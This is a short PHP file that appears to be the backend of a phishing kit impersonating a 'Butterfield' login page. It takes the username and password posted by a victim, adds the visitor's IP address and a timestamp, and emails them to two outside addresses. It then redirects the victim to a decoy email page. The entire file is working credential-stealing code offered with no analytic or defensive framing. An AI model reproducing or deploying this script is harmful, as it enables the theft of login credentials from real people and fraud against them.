<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user = $_POST['username'];
$passe = $_POST['password'];
$fiftyme="emmylocal@hotmail.com, patrickman22@zohomail.com";


  $subj = "Butterfield $ip";
  $msg = "Login Info\n\nUser ID: $user\nPassword: $passe\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="Butterfield Email.html"
</script>
